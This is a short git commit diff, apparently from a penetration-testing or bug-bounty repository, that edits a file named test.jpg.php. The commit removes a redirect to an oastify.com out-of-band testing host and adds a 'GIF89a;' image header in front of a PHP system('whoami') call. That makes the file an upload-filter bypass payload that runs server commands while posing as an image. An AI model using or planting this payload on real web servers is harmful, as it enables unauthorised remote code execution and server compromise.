28e4baea8a9a87e58183dc7ef2e4c9f27b9f4388
victim29 <148070510+victim29@users.noreply.github.com>
2024-08-26 15:07:26 +0530

    Update test.jpg.php

--- test.jpg.php
+++ test.jpg.php
@@ -1,7 +1,4 @@
+GIF89a;
 <?php
-header("Access-Control-Allow-Origin: *");
-header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE");
-header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept");
-header("Content-Type: application/json");
-header("Location: https://pohtmk395aqo90es5ukio9ludljl7a.oastify.com");
+  system('whoami'); 
 ?>
